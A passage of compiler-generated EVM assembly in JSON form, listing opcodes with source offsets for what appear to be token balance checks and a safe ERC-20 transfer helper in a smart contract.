										{
											"begin": 18229,
											"end": 18253,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18229,
											"end": 18253,
											"name": "SWAP2"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP4"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "ADD"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP3"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP3"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP2"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP3"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SUB"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "ADD"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP2"
										},
										{
											"begin": 18236,
											"end": 18242,
											"name": "DUP7"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "DUP1"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "309"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "309"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "GAS"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "STATICCALL"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "310"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "310"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MLOAD"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "311"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "311"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "MLOAD"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "SLOAD"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP2"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MSTORE"
										},
										{
											"begin": 18315,
											"end": 18319,
											"name": "ADDRESS"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP3"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "ADD"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MSTORE"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "SWAP1"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "SWAP3"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "AND"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "SWAP2"
										},
										{
											"begin": 18282,
											"end": 18306,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 18282,
											"end": 18306,
											"name": "SWAP2"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP3"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "ADD"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP3"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 18229,
											"end": 18268,
											"name": "SWAP3"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP2"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP3"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SWAP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "SUB"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "ADD"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP2"
										},
										{
											"begin": 18289,
											"end": 18295,
											"name": "DUP7"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "DUP1"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "312"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "312"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "GAS"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "STATICCALL"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "313"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 45,
											"end": 61,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 42,
											"end": 43,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 39,
											"end": 40,
											"name": "DUP1"
										},
										{
											"begin": 24,
											"end": 62,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 77,
											"end": 93,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 74,
											"end": 75,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 67,
											"end": 94,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "313"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MLOAD"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "314"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "314"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 18282,
											"end": 18321,
											"name": "MLOAD"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "PUSH",
											"value": "B"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "DUP1"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "DUP3"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "AND"
										},
										{
											"begin": 18335,
											"end": 18343,
											"name": "SWAP2"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 18357,
											"end": 18365,
											"name": "SWAP1"
										},
										{
											"begin": 18357,
											"end": 18365,
											"name": "DIV"
										},
										{
											"begin": 18357,
											"end": 18365,
											"name": "AND"
										},
										{
											"begin": 18208,
											"end": 18215,
											"name": "PUSH [tag]",
											"value": "179"
										},
										{
											"begin": 18208,
											"end": 18375,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 18208,
											"end": 18375,
											"name": "tag",
											"value": "308"
										},
										{
											"begin": 18208,
											"end": 18375,
											"name": "JUMPDEST"
										},
										{
											"begin": 1266,
											"end": 1267,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1255,
											"end": 1263,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1255,
											"end": 1267,
											"name": "SSTORE"
										},
										{
											"begin": 18168,
											"end": 18382,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "tag",
											"value": "142"
										},
										{
											"begin": 1587,
											"end": 1925,
											"name": "JUMPDEST"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MLOAD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP1"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "ADD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "19"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP2"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "7472616E7366657228616464726573732C75696E743235362900000000000000"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "SWAP2"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "DUP3"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "ADD"
										},
										{
											"begin": 516,
											"end": 550,
											"name": "MSTORE"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP2"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP6"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP2"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "AND"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP4"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "ADD"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "MSTORE"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP1"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP4"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "ADD"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP7"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "SWAP1"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "MSTORE"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP5"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "MLOAD"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP1"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "DUP5"
										},
										{
											"begin": 26,
											"end": 47,
											"name": "SUB"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP1"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "SWAP2"
										},
										{
											"begin": 22,
											"end": 54,
											"name": "ADD"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "DUP2"
										},
										{
											"begin": 6,
											"end": 55,
											"name": "MSTORE"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "SWAP1"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "SWAP3"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "ADD"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "DUP5"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "MSTORE"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "ADD"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "DUP1"
										},
										{
											"begin": 61,
											"end": 78,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 182,
											"end": 197,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A9059CBB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 179,
											"end": 208,
											"name": "OR"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "DUP2"
										},
										{
											"begin": 160,
											"end": 209,
											"name": "MSTORE"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP3"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "MLOAD"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP2"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "MLOAD"
										},
										{
											"begin": 1668,
											"end": 1680,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1668,
											"end": 1680,
											"name": "SWAP5"
										},
										{
											"begin": 1682,
											"end": 1699,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 1682,
											"end": 1699,
											"name": "SWAP5"
										},
										{
											"begin": 1703,
											"end": 1713,
											"name": "DUP10"
										},
										{
											"begin": 1703,
											"end": 1713,
											"name": "AND"
										},
										{
											"begin": 1703,
											"end": 1713,
											"name": "SWAP4"
										},
										{
											"begin": 1727,
											"end": 1770,
											"name": "SWAP3"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP3"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "SWAP1"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP1"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP4"
										},
										{
											"begin": 25,
											"end": 43,
											"name": "DUP4"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "316"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 66,
											"end": 68,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 61,
											"end": 64,
											"name": "DUP4"
										},
										{
											"begin": 58,
											"end": 69,
											"name": "LT"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "318"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPI"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "DUP1"
										},
										{
											"begin": 176,
											"end": 186,
											"name": "MLOAD"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "DUP3"
										},
										{
											"begin": 164,
											"end": 187,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP1"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP3"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 139,
											"end": 151,
											"name": "SWAP2"
										},
										{
											"begin": 98,
											"end": 100,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "DUP3"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "ADD"
										},
										{
											"begin": 89,
											"end": 101,
											"name": "SWAP2"
										},
										{
											"begin": 114,
											"end": 126,
											"name": "ADD"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "PUSH [tag]",
											"value": "316"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMP"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "tag",
											"value": "318"
										},
										{
											"begin": 36,
											"end": 189,
											"name": "JUMPDEST"
										},
										{
											"begin": 274,
											"end": 275,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 267,
											"end": 270,
											"name": "DUP4"
										},
										{
											"begin": 263,
											"end": 265,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 259,
											"end": 271,
											"name": "SUB"
										},
										{
											"begin": 254,
											"end": 257,
											"name": "PUSH",
											"value": "100"
										},
										{
											"begin": 250,
											"end": 272,
											"name": "EXP"
										},
										{
											"begin": 246,
											"end": 276,
											"name": "SUB"
										},
										{
											"begin": 315,
											"end": 319,
											"name": "DUP1"
										},
										{
											"begin": 311,
											"end": 320,
											"name": "NOT"
										},
										{
											"begin": 305,
											"end": 308,
											"name": "DUP3"
										},
										{
											"begin": 299,
											"end": 309,
											"name": "MLOAD"
										},
										{
											"begin": 295,
											"end": 321,
											"name": "AND"
										},
										{
											"begin": 356,
											"end": 360,
											"name": "DUP2"
										},
										{
											"begin": 350,
											"end": 353,
											"name": "DUP5"
										},
										{
											"begin": 344,
											"end": 354,
											"name": "MLOAD"
										},
										{
											"begin": 340,
											"end": 361,
											"name": "AND"
										},
										{
											"begin": 389,
											"end": 396,
											"name": "DUP1"
										},
										{
											"begin": 380,
											"end": 387,
											"name": "DUP3"
										},
										{
											"begin": 377,
											"end": 397,
											"name": "OR"
										},
										{
											"begin": 372,
											"end": 375,
											"name": "DUP6"
										},
										{
											"begin": 365,
											"end": 398,
											"name": "MSTORE"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 3,
											"end": 402,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP1"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "ADD"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "MLOAD"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP1"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP4"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SUB"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP2"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "DUP7"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "GAS"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "CALL"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1703,
											"end": 1780,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 14,
											"end": 15,
											"name": "DUP1"
										},
										{
											"begin": 21,
											"end": 22,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "DUP2"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "EQ"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "PUSH [tag]",
											"value": "320"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPI"
										},
										{
											"begin": 75,
											"end": 79,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 69,
											"end": 80,
											"name": "MLOAD"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "SWAP2"
										},
										{
											"begin": 64,
											"end": 80,
											"name": "POP"
										},
										{
											"begin": 144,
											"end": 148,
											"name": "PUSH",
											"value": "1F"
										},
										{
											"begin": 140,
											"end": 149,
											"name": "NOT"
										},
										{
											"begin": 133,
											"end": 137,
											"name": "PUSH",
											"value": "3F"
										},
										{
											"begin": 115,
											"end": 131,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 111,
											"end": 138,
											"name": "ADD"
										},
										{
											"begin": 107,
											"end": 150,
											"name": "AND"
										},
										{
											"begin": 104,
											"end": 105,
											"name": "DUP3"
										},
										{
											"begin": 100,
											"end": 151,
											"name": "ADD"
										},
										{
											"begin": 94,
											"end": 98,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 87,
											"end": 152,
											"name": "MSTORE"
										},
										{
											"begin": 169,
											"end": 185,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 166,
											"end": 167,
											"name": "DUP3"
										},
										{
											"begin": 159,
											"end": 186,
											"name": "MSTORE"
										},
										{
											"begin": 225,
											"end": 241,
											"name": "RETURNDATASIZE"
										},
										{
											"begin": 222,
											"end": 223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 215,
											"end": 219,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 212,
											"end": 213,
											"name": "DUP5"
										},
										{
											"begin": 208,
											"end": 220,
											"name": "ADD"
										},
										{
											"begin": 193,
											"end": 242,
											"name": "RETURNDATACOPY"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "PUSH [tag]",
											"value": "319"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMP"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "tag",
											"value": "320"
										},
										{
											"begin": 16,
											"end": 47,
											"name": "JUMPDEST"
										},
										{
											"begin": 36,
											"end": 40,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "SWAP2"
										},
										{
											"begin": 31,
											"end": 40,
											"name": "POP"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "tag",
											"value": "319"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "JUMPDEST"
										},
										{
											"begin": 7,
											"end": 249,
											"name": "POP"
										},
										{
											"begin": 1667,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 1667,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1667,
											"end": 1780,
											"name": "SWAP2"
										},
										{
											"begin": 1667,
											"end": 1780,
											"name": "POP"
										},
										{
											"begin": 1811,
											"end": 1818,
											"name": "DUP2"
										},
										{
											"begin": 1811,
											"end": 1868,
											"name": "DUP1"
										},
										{
											"begin": 1811,
											"end": 1868,
											"name": "ISZERO"
										},
										{
											"begin": 1811,
											"end": 1868,
											"name": "PUSH [tag]",
											"value": "322"
										},
										{
											"begin": 1811,
											"end": 1868,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 1823,
											"end": 1834,
											"name": "DUP1"
										},
										{
											"begin": 1823,
											"end": 1834,
											"name": "MLOAD"
										},
										{
											"begin": 1823,
											"end": 1839,
											"name": "ISZERO"
										},
										{
											"begin": 1823,
